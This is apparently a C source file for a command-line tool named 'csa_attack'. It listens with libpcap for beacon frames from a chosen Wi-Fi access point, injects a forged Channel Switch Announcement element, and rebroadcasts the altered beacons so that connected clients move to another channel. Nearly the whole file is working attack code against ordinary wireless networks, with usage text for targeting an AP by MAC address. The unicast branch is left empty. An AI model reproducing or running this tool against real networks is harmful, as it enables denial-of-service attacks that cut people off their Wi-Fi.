#include <pcap.h>
#include <stdbool.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <time.h>
#include "option.h"

#define MAC_ADDR_LEN 6
#define DEFAULT_ARGV_LEN 4
#define ARGV_MAX_LEN DEFAULT_ARGV_LEN + 6 // option_len * 2

int Wireless_Channel[58] = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10,
                            11, 12, 13, 14, 15, 16, 17, 18, 20, 24,
                            28, 32, 36, 40, 44, 48, 52, 56, 60, 64,
                            68, 72, 76, 80, 84, 88, 92, 96, 100, 104,
                            108, 112, 116, 120, 124, 128, 132, 136, 140, 144,
                            149, 153, 157, 161, 165, 169, 173, 177};

typedef struct radiotap
{
    u_char hdr_rev;
    u_char hdr_pad;
    u_short hdr_len;
    u_char present_flag[12]; //이 길이 가변이라 보내는 놈의 안테나길이에 따라 가변임
    u_char flags;
} Radio;
typedef struct wlan_Beacon_hdr
{
    // u_char type;                    //Type/Subtype
    u_short type;                   // Frame Control Field, [1000 ....] : subtype-8, [.... 00..] : Management frame, [.... ..00] : version
    u_short dur;                    // Duration
    u_char mac_des[MAC_ADDR_LEN];   // Destination address
    u_char mac_src[MAC_ADDR_LEN];   // Source address
    u_char mac_bssid[MAC_ADDR_LEN]; // BSS Id
    u_char Frag_num : 4;            // Fragment number
    u_int Seq_num : 12;             // Sequence number
} BeaconHd;

typedef struct tagged_parameters
{
    u_char tag_number;
    u_char tag_length;
} tag;

typedef struct Proberesponse // 44여야함
{
    // Radio 8
    u_char hdr_rev;
    u_char hdr_pad;
    u_short hdr_len;
    u_int present_flag;
    // Probe Response 24
    u_short type;
    u_short dur;
    u_char mac_Des[MAC_ADDR_LEN];
    u_char mac_src[MAC_ADDR_LEN];
    u_char mac_bssid[MAC_ADDR_LEN];
    u_short fs_number;
    // Fixed  parameters 12
    u_int64_t time;
    u_short interval;
    u_short capabilities;

} probe; // 44

void usage()
{
    printf("syntax: csa_attack <interface> <AP mac> <Ch> \n");
    printf("sample: csa_attack wlan0 11:22:33:44:55:66 13\n");
    printf("<Option>\n");
    printf(" -c : Switching Channel\n");
    printf(" -t : Time(sec)\n");
    printf(" -d : STA mac, Attack Type, if This option exists, the packet is sent as unicast \n");
}

typedef struct
{
    char *dev_;
} Param;

Param param = {
    .dev_ = NULL};

bool parse(Param *param, int argc, char *argv[])
{

    // Option이 존재하는데 argc가 DEFAULT_ARGV_LEN 일때(no option), argc가 DEFAULT_ARGV_LEN보다 작을때(기본옵션보다 적음), argc가 DEFAULT_ARGV_LEN인데 Option이 존재할때(디폴트옵션이 적을때), argc가 ARGV_MAX_LEN보다 클때(인자가 너무 많을때), argc가 옵션이 없는데 Default보다 클때
    if ((argc == DEFAULT_ARGV_LEN && is_Op) || argc < DEFAULT_ARGV_LEN || (argc == DEFAULT_ARGV_LEN && is_Op) || ARGV_MAX_LEN < argc || (DEFAULT_ARGV_LEN < argc && !is_Op) || Op_a)
    {
        printf("argc : %d\n", argc);
        usage();
        return false;
    }
    param->dev_ = argv[1];
    return true;
}

void Mac_(const char *arr, u_char mac_addr[6]);
bool isBeacon(const u_char *packet);
bool arrncmp(const char *arr1, const char *arr2, int len);
void expArray(u_char *packet, int len, int pivot); //배열 공간 생성
void PtData(const u_char *packet, u_char caplen);
int csaATK(const unsigned char *Interface, const unsigned char *Input_AP_MAC, const unsigned char *Input_STA_MAC, const unsigned char *Input_AP_Ch, Opt *opt);

int main(int argc, char *argv[])
{
    setbuf(stdin, NULL);
    setbuf(stdout, NULL);
    setbuf(stderr, NULL);

    Opt opt;

    optionParse(argc, argv, &opt);
    if (!parse(&param, argc, argv))
        return -1;

    unsigned char *Interface = argv[argc - DEFAULT_ARGV_LEN + 1];
    unsigned char *Input_AP_MAC = argv[argc - DEFAULT_ARGV_LEN + 2];
    unsigned char *Input_STA_MAC;
    unsigned char *Input_Ssid;
    unsigned char *Input_AP_Ch = argv[argc - DEFAULT_ARGV_LEN + 3];

    if (Op_d)
    {
        Input_STA_MAC = "ff:ff:ff:ff:ff:ff";
    }
    else
    {
        Input_STA_MAC = opt.Op_d_stamac;
    }

    csaATK(Interface, Input_AP_MAC, Input_STA_MAC, Input_AP_Ch, &opt);
}

void Mac_(const char *arr, u_char mac_addr[6])
{
    int a;
    if (strlen(arr) != 17)
    {
        printf("Maclen error!!\n");
    }
    char cpyarr[18];
    memcpy(cpyarr, arr, 17);
    for (int i = 0; i < 6; i++) //입력Mac값의 콜론 제거
    {
        cpyarr[i * 3 + 2] = '\0';
        sscanf((const char *)&cpyarr[3 * i], "%x", &a);
        mac_addr[i] = (u_char)a;
    }
}

bool isBeacon(const u_char *packet)
{
    Radio *rad;
    rad = (Radio *)packet;
    //printf("rev : %d\npad : %d\n len:%d\n",rad->hdr_rev,rad->hdr_pad,rad->hdr_len);
    BeaconHd *bec;
    bec = (BeaconHd *)(packet + rad->hdr_len);
    if (htons(bec->type) == 0x8000)
    {
        return true;
    }
    else
    {
        return false;
    }
}

bool arrncmp(const char *arr1, const char *arr2, int len)
{
    for (int i = 0; i < len; i++)
    {
        if (arr1[i] != arr2[i])
        {
            return false;
        }
    }
    return true;
}

void expArray(u_char *arr, int len, int pivot)
{ // len : 배열의 길이, pivot : 어디까지 뒤로 밀어낼지
    // realloc으로 미리 공간 늘려주고 보내줘야함
    for (int i = len - 1 - 5; i >= pivot; i--)
    {
        arr[i + 5] = arr[i];
    }
}

void PtData(const u_char *packet, u_char caplen)
{
    for (int i = 0; i < caplen; i++)
    {
        if (i % 8 == 0 && i != 0 && i % 16 != 0)
        {
            printf("| ");
        }
        if (i % 16 == 0 && i != 0)
        {
            printf("\n");
        }
        *(packet + i) < 16 ? printf("0%x ", *(packet + i)) : printf("%x ", *(packet + i));
    }
    printf("\n");
}

int csaATK(const unsigned char *Interface, const unsigned char *Input_AP_MAC, const unsigned char *Input_STA_MAC, const unsigned char *Input_AP_Ch, Opt *opt)
{

    unsigned char ApCh = atoi(Input_AP_Ch);
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t *pcap = pcap_open_live(Interface, BUFSIZ, 1, 1000, errbuf);
    if (pcap == NULL)
    {
        fprintf(stderr, "pcap_open_live(%s) return null - %s\n", param.dev_, errbuf);
        return -1;
    }
    time_t start_time, now_time;
    double duration;
    if (Op_t)
    {
        start_time = time(NULL);
    }
    int packet_count = 0;
    while (true)
    {
        if (Op_t)
        {
            now_time = time(NULL);
            duration = (double)(now_time - start_time);
            if (duration >= opt->Op_t_time)
            {
                break;
            }
        }
        struct pcap_pkthdr *header;
        const u_char *packet;
        int res = pcap_next_ex(pcap, &header, &packet);
        if (res == 0)
            continue;
        if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK)
        {
            printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(pcap));
            break;
        }
        PtData(packet,header->caplen);
        Radio *rad;
        rad = (Radio *)packet;
        u_char AP_MAC[6];
        bool isFcS;

        u_char *send_packet;

        // Broadcast
        if (!Op_d)
        {
            if (isBeacon(packet))
            {
                /*----------이거 함수화----------*/
                unsigned char ChangeCh;
                if (Op_c)
                {
                    ChangeCh = opt->Op_c_ch;
                }
                else
                {
                    srand(time(NULL));

                    while (true)
                    {
                        int random = rand() % 58;
                        if (Wireless_Channel[random] != ApCh && (Wireless_Channel[random] > ApCh + 10 || Wireless_Channel[random] < ApCh - 10))
                        {
                            ChangeCh = Wireless_Channel[random];
                            break;
                        }
                    }
                }
                /*----------이거 함수화----------*/
                if ((rad->flags >> 4) == 1)
                {
                    isFcS = true;
                }
                else
                {
                    isFcS = false;
                }

                Mac_(Input_AP_MAC, AP_MAC);

                BeaconHd *becH;
                becH = (BeaconHd *)(packet + rad->hdr_len);
                if (arrncmp(AP_MAC, becH->mac_src, 6))
                {
                    send_packet = (u_char *)malloc(sizeof(u_char) * (header->caplen));
                    if (send_packet == NULL)
                    {
                        continue;
                    }
                    memcpy(send_packet, packet, header->caplen);
                    /*----------이거 함수화----------*/
                    if (isFcS)
                    {
                        *(send_packet + 16) = 0x00; // fcs
                    }
                    /*----------이거 함수화----------*/
                    Radio *rad;
                    rad = (Radio *)send_packet;
                    u_int not_tag_len = (rad->hdr_len) + 24 + 12;
                    u_int tag_len = (header->caplen) - 4 - not_tag_len;
                    u_int total_len = not_tag_len + tag_len;
                    tag *tagged;
                    bool csa_inject = false;
                    int error;
                    /*----------이거 함수화----------*/
                    for (int i = 0; i < tag_len; i)
                    {
                        tagged = (tag *)(send_packet + not_tag_len + i);
                        if (tagged->tag_number > 37)
                        {
                            total_len += 5;                                                                    // CSA넣을 5byte 증가
                            char *tmp = (char *)realloc(send_packet, sizeof(u_char) * ((header->caplen) + 5)); // 5byte 증가
                            if (tmp != NULL)
                            {
                                send_packet = tmp;
                            }
                            expArray(send_packet, total_len, not_tag_len + i - 1); // csa를 넣을 공간 생성
                            /*----------이거 함수화----------*/
                            *(send_packet + not_tag_len + i) = 0x25;
                            *(send_packet + not_tag_len + i + 1) = 0x3;
                            *(send_packet + not_tag_len + i + 2) = 0x1;
                            *(send_packet + not_tag_len + i + 3) = ChangeCh;
                            *(send_packet + not_tag_len + i + 4) = 0x1;
                            csa_inject = true;
                            break;
                        }
                        i += tagged->tag_length + 2;
                    }
                    if (csa_inject == false)
                    { // tag를 끝까지 돌아도 37(CSA)을 넘는 테그가 없다면

                        char *tmp = (char *)realloc(send_packet, sizeof(u_char) * ((header->caplen) + 5)); // 5byte 증가
                        if (tmp != NULL)
                        {
                            send_packet = tmp;
                        }
                        /*----------이거 함수화----------*/
                        *(send_packet + header->caplen) = 0x25;
                        *(send_packet + header->caplen + 1) = 0x3;
                        *(send_packet + header->caplen + 2) = 0x1;
                        *(send_packet + header->caplen + 3) = ChangeCh;
                        *(send_packet + header->caplen + 4) = 0x1;
                    }

                    for (int i = 0; i < 4; i++)
                    {

                        printf("[%d] send packet !!! \n", ++packet_count);
                        if (pcap_sendpacket(pcap, send_packet, total_len) != 0)
                        {
                            fprintf(stderr, "\nError sending the packet: %s\n", pcap_geterr(pcap));
                            return -1;
                        }
                    }

                    free(send_packet);
                }
            }
            else
            {
                continue;
            }
        }
        else //Unicast
        {

        }
    }
    pcap_close(pcap);
    return 0;
}
